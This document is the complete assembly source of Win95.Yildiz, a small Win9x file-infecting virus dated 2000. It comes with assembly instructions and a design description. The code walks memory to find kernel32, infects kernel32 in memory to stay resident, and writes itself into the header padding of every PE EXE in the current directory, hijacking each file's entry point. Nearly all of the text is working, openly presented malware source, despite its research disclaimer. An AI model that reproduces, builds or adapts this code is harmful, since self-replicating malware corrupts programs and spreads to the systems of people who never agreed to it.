; *************************************************************************
; ********************                                 ********************
; ********************           Win95.Yildiz          ********************
; ********************                by               ********************
; ********************            Black Jack           ********************
; ********************                                 ********************
; *************************************************************************

comment ~

NAME: Win95.Yildiz
AUTHOR: Black Jack [independant Austrian Win32asm virus coder]
CONTACT: Black_Jack_VX@hotmail.com | http://www.coderz.net/blackjack
TYPE: Win9x direct acting/global ring3 resident PE header cavity virus
SIZE: 323 bytes (but of course infected files won't increase in size)

DESCRIPTION: When an infected file is run, the virus takes control. It then
             tries to find the kernel32 base address by a simple algorithm
             which should make it compatible with Win9X and WinME (although I
             haven't tested it with the second one). After that it gets the
             undocumented Win9X API VxDCall0 and uses it to call int 21h. The
             VxDCall0 API is the very first exported API in Win9X; I don't
             know which API is first in WinNT, that's why unpredictable
             results may occur when the virus runs in that OS (I haven't tried
             it out, but of course the virus can't work in NT).
             Then it goes TSR (read more about this a bit later), and infects
             all PE EXE files in the current directory by overwriting the
             unused padding bytes in the PE header with the virus body.
             The memory residency consist in infecting kernel32.dll in memory.
             To do so, it creates a temporary file called "Yildiz." and writes
             the first 4KB of kernel32.dll there. Then this file is infected
             like any other PE file. And finally the content of the infected
             temp file is read back into kernel32 memory. Yep, you have read
             right, by using the int21h with VxDCall0 you can read from a file
             into read-only memory! (This trick was discovered by Murkry/IkX,
             read more about it in the comments to his Darkside virus source,
             published in Xine#3).
             As I have already said, the kernel32 is infected in memory just
             like any other file, this means the entry point is set to the
             virus, no APIs are hooked. As you should know, the entry point
             of a DLL is a init routine that is called whenever the DLL is
             loaded by a program. And since kernel32 is imported by all
             programs, this means for us that whenever a program is run (and
             kernel32 is mapped into the program's address space), our virus
             will infect all PE EXE files in the directory of the program.

ASSEMBLE WITH: 
                tasm32 /mx /m yildiz.asm
                tlink32 /Tpe /aa yildiz.obj,,, import32.lib

                there's no need for PEWRSEC or a similar tool, because the
                virus code is supposed to run in read-only memory anyways.

DISCLAIMER: I do *NOT* support the spreading of viruses in the wild.
            Therefore, this source was only written for research and
            education. Please do not spread it. The author can't be hold
            responsible for what you decide to do with this source.

~
; ===========================================================================


virus_size  EQU  (virus_end - virus_start)

Extrn MessageBoxA:Proc                  ; for first generation only
Extrn ExitProcess:Proc

.386p
.model flat
.data
        dd 0                            ; dummy data, you know...

.code
virus_start:
        pushad                          ; save all registers

        xchg edi, eax                   ; put delta offset to EDI (EAX=start
                                        ; offset of program by default)

        mov eax, [esp+8*4]              ; EAX=some address inside kernel32

        sub esp, size stack_frame       ; reserve room on stack
        mov esi, esp                    ; set ESI to our data on the stack

search_kernel32:
        xor ax,ax                       ; we assume the least significant
                                        ; word of the kernel32 base is zero
        cmp word ptr [eax], "ZM"        ; is there a MZ header ?
        JE found_kernel32               ; if yes, we found the correct
                                        ; kernel32 base address
        dec eax                         ; 0BFF80000->0BFF7FFFF, and then the
                                        ; least significant word is zeroed
        JMP search_kernel32             ; check next possible kernel32 base

tmp_filename    db "Yildiz", 0
filespec        db "*.EXE", 0


found_kernel32:
        mov ebx, [eax+3Ch]              ; EBX=kernel32 PE header RVA
        add ebx, eax                    ; EBX=offset of kernel32 PE header

        mov ebx, [ebx+120]              ; EBX=export table RVA
        mov ebx, [ebx+eax+1Ch]          ; EBX=Address array of API RVAs
        mov ebx, [ebx+eax]              ; get the first API RVA: VxDCall0
        add ebx, eax                    ; EBX=Offset VxDCall0 API
        mov [esi.VxDCall0], ebx         ; save it
        lea ebp, [edi+int21h-virus_start] ; EBP=offset of our int21h procedure
                                        ; for optimisation reasons, the
                                        ; CALL EBP instruction is just 2 bytes


; ----- GO TSR --------------------------------------------------------------

        lea edx, [edi+tmp_filename-virus_start] ; EDX=pointer to tmp filename
        push edx                        ; save it on stack

        push eax                        ; save kernel32 base address on stack

        mov ah, 3Ch                     ; create temp file
        xor ecx, ecx                    ; no attributes
        call ebp                        ; call our int 21h procedure

        xchg ebx, eax                   ; filehandle to EBX, where it belongs

        pop edx                         ; EDX=kernel32 base address
        push edx                        ; save it again

        call write_file                 ; write start of kernel32 to temp file

        call infect                     ; infect the temp file

        pop edx                         ; EDX=kernel32 base address

        mov ah, 3Fh                     ; read infected kernel32 fileststart
        call read_write                 ; into kernel32 memory

        mov ah, 3Eh                     ; close temp file
        call ebp                        ; call our int 21h procedure

        pop edx                         ; EDX=pointer to temp filename
        mov ah, 41h                     ; delete temp file
        call ebp                        ; call our int 21h procedure


; ----- INFECT ALL FILES IN CURRENT DIR -------------------------------------

        mov ah, 2Fh                     ; get DTA
        call ebp                        ; call our int 21h procedure

        push es                         ; save DTA address to stack
        push ebx

        push ds                         ; ES=DS (standart data segment)
        pop es

        mov ah, 1Ah                     ; set DTA to our data area
        lea edx, [esi.dta]              ; DS:EDX=new DTA adress
        call ebp                        ; call our int 21h procedure

        mov ah, 4Eh                     ; find first file
        xor ecx, ecx                    ; only files with standart attributes
        lea edx, [edi+(filespec-virus_start)]  ; EDX=offset of filespec

findfile_loop:
        call ebp                        ; call our int 21h procedure
        JC all_done                     ; no more files found?

        mov ax, 3D02h                   ; open victim file for read and write
        lea edx, [esi.dta+1Eh]          ; DS:EDX=pointer to filename in DTA
        call ebp                        ; call our int 21h procedure

        xchg ebx, eax                   ; handle to EBX, where it belongs

        call infect                     ; infect the file

        mov ah, 3Eh                     ; close the victim file
        call ebp                        ; call our int 21h procedure

search_on:
        mov ah, 4Fh                     ; find next file
        JMP findfile_loop


; ----- RESTORE HOST --------------------------------------------------------

all_done:
        pop edx                         ; restore old DTA offset in DS:EDX
        pop ds
        mov ah, 1Ah                     ; reset DTA to old address
        call ebp                        ; call our int 21h procedure

        push es                         ; DS=ES (standart data segment)
        pop ds

        add esp, size stack_frame       ; remove our data buffer from stack

        popad                           ; restore all registers

        db 05h                          ; add eax, imm32
entry_RVA_difference dd (host-virus_start)  ; difference between host and
                                            ; virus entrypoint (EAX is virus
                                            ; entrypoint offset by default)
        JMP eax                         ; jump to host entrypoint

; ----- END MAIN PART OF THE VIRUS CODE -------------------------------------

exit_infect:
        pop edi                         ; restore EDI (delta offset)
        RET                             ; return to caller

; ----- INFECT AN OPENED FILE (HANDLE IN BX) --------------------------------

infect:
        push edi                        ; save EDI (delta offset)

        mov edx, esi                    ; EDX=read/write buffer offset
        mov ah, 3Fh                     ; read start of file
        call read_write

        cmp word ptr [esi], "ZM"        ; is it an exe file ?
        JNE exit_infect                 ; cancel infection if not

        mov ecx, [esi+3Ch]              ; ECX=new header RVA
        cmp ecx, 3*1024                 ; check if DOS stub is small enough
                                        ; so that all the PE header is in
                                        ; our buffer
        JA exit_infect                  ; if not, cancel infection

        lea edi, [esi+ecx]              ; EDI=PE header offset in memory
        cmp word ptr [edi], "EP"        ; is it an PE file ?
                                        ; (I know that the PE marker is
                                        ; actually a dword, but by only
                                        ; checking one word we save a byte
                                        ; of virus code)
        JNE exit_infect                 ; cancel infection if not

        cmp dword ptr [edi+28h], 4096   ; check if entrypoint RVA is in the
                                        ; first 4 KB of the file
        JB exit_infect                  ; if yes, the file must be already
                                        ; infected, cancel infection

        add ecx, 24                     ; add size of FileHeader
        movzx eax, word ptr [edi+14h]   ; EAX=size of Optional header
        add ecx, eax                    ; add it to ECX
        movzx eax, word ptr [edi+6]     ; EAX=NumberOfSections
        imul eax, eax, 40               ; get size of section headers to EAX
        add ecx, eax                    ; add it to ECX, now it points to the
                                        ; end of the used part of the PE
                                        ; header, where the virus will be.

        mov edx, ecx                    ; EDX=virus RVA
        xchg dword ptr [edi+28h], edx   ; set it as new entrypoint RVA
        sub edx, ecx                    ; EDX=difference between old and new
                                        ; entrypoint RVA

        mov eax, [edi+54h]              ; EAX=SizeOfHeaders (aligned to
                                        ; FileAlign)

        lea edi, [esi+ecx]              ; EDI=virus offset in buffer

        sub eax, ecx                    ; EAX=free room for us to use
        mov cx, virus_size              ; ECX=size of virus (the most
                                        ; significant word of ECX should be 0)
        cmp eax, ecx                    ; enough room for the virus ?
        JL exit_infect                  ; cancel infection if not

        pop eax                         ; EAX=delta offset
        push eax                        ; save it again to stack
        xchg esi, eax                   ; ESI=delta offset, EAX=data buffer

        cld                             ; clear direction flag
        rep movsb                       ; move virus body into buffer

        xchg esi, eax                   ; ESI=pointer to our data on stack

        mov [edi-(virus_end-entry_RVA_difference)], edx  ; store difference
                                        ; between old and new entrypoint

        pop edi                         ; restore EDI (delta offset)

        mov edx, esi                    ; EDX=offset of read/write buffer

                                        ; now write modified start of file,
                                        ; then return to caller

write_file:
        mov ah, 40h                     ; write to file

read_write:
        xor ecx, ecx                    ; ECX=0
        pushad                          ; save all registers

        xor eax, eax                    ; EAX=4200h (set filepointer from
        mov ah, 42h                     ; start of the file
        cdq                             ; CX:DX=0 (new filepointer)
        call ebp                        ; call our int 21h procedure

        popad                           ; restore all registers

        mov ch, 10h                     ; ECX=4096 (size of read/write buffer)

                                        ; now execute int 21h and return

int21h:                                 ; protected mode int21
        push ecx                        ; push parameters
        push eax
        push 2A0010h                    ; VWIN32_Int21Dispatch function
        call ss:[esi.VxDCall0]          ; call VxDCall0 API
        ret

virus_end:

; This is our data that will be stored on the stack:

stack_frame     struc
buffer          db 4096 dup(?)
dta             db 43 dup(?)
VxDCall0        dd ?
stack_frame     ends


host:
        push 0
        push offset caption
        push offset message
        push 0
        call MessageBoxA

        push 0
        call ExitProcess

caption db "Win95.Yildiz Virus (c) 2000 Black Jack", 0
message db "first generation dropper", 0

end virus_start
